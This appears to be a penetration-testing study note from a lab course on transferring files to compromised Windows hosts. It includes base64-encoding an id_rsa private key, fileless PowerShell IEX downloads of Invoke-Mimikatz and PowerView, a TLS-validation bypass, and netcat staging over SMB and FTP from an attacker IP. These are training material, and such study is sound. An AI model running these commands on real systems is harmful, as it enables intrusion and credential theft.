# File Transfer

## Windows File Transfer Methods

<details>

<summary>Windows File Transfer Methods</summary>



## **PowerShell Base64 Encode & Decode**

* use `md5sum filename` to get the md5 hash of file.
* then encode the file using `base64` ; `cat id_rsa |base64 -w 0;echo`
* now copy paste this encoded `base64` data into windows, use powershell to decode this `base64` data .
* then check the `md5` hash of this file to that of 1st step.

## **PowerShell Web Downloads** ⭐

System.Net.WebClient class in powershell can be used to download a file over HTTP, HTTP and FTP.

#### **PowerShell DownloadFile Method**

```powershell
PS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')PS)
C:\\htb> (New-Object Net.WebClient).DownloadFile('<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1>')

PS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')PS 
C:\\htb> (New-Object Net.WebClient).DownloadFileAsync('<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1>', 'C:\\Users\\Public\\PowerViewAsync.ps1')
```

#### **PowerShell DownloadString - Fileless Method**

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```jsx
PS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1>')

or

PS C:\\htb> (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1>') | IEX

```

#### **PowerShell Invoke-WebRequest**

```jsx
PS C:\\htb> Invoke-WebRequest <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1> -OutFile PowerView.ps1

```

## Common Errors with PowerShell ⭐

*   There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

    This can be bypassed using the parameter `-UseBasicParsing`.

```jsx
PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest <https://raw.githubusercontent.com/PowerShellMafia/P> ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

* Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
PS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1>')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubuserc> ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## **SMB Downloads⭐**

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

* create smb server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
* `copy \\\\192.168.220.133\\share\\nc.exe` to copy file from pwnbox to Windows

new version of windows block un authenticated guest access, we can fix this by

* create smb server `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test - password test`
* to copy file from pwnbox to Windows `net use n: \\\\192.168.220.133\\share /user:test test`
  * and then `copy n:\\nc.exe`

## FTP Downloads⭐

* configure ftp server in a our attacker machine using python3 `pyftpdlib` module. `sudo python3 -m pyftpdlib --port 21`
* once configured, we can perform file transfer using Powershell Net.WebClient
  * `PS C:\\htb> (New-Object Net.WebClient).DownloadFile('<ftp://192.168.49.128/file.txt>', 'C:\\Users\\Public\\ftp-file.txt')`

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

```jsx
C:\\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\\htb> echo USER anonymous >> ftpcommand.txt
C:\\htb> echo binary >> ftpcommand.txt
C:\\htb> echo GET file.txt >> ftpcommand.txt
C:\\htb> echo bye >> ftpcommand.txt
C:\\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\\htb>more file.txt
This is a test file
```

</details>



